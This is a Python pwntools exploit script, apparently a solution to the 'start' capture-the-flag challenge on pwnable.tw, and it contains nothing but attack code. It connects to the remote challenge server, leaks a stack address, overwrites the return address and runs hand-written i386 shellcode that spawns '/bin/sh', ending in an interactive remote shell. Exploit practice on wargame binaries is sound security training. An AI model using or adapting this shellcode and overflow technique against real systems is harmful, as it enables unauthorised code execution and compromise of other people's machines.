#!/usr/bin/python3
from pwn import *

#p = remote("chall.pwnable.tw", 10000)
#p = gdb.debug("./start", "b* _start+0x39 \n c")
p = remote("chall.pwnable.tw",10000)

exe = ELF('./start')
context.binary = exe

shellcode = asm(
    '''
    push   6845231       
    push   1852400175         
    mov    ebx, esp           /* ebx -> "/bin/sh" */
    xor     ecx,ecx
    xor     edx,edx
    mov    al, 0x0b          
    int    0x80
''',arch = 'i386'
)


payload = shellcode
payload += p32(0x08048087) #return
p.sendafter("Let's start the CTF:", payload)
leak_stack = u32(p.recv(4))
shellcode_addr = leak_stack - 0x1c
log.info(f'stack leak: {hex(leak_stack)}')
payload = shellcode
payload += p32(shellcode_addr) #return
p.send(payload)
p.interactive()
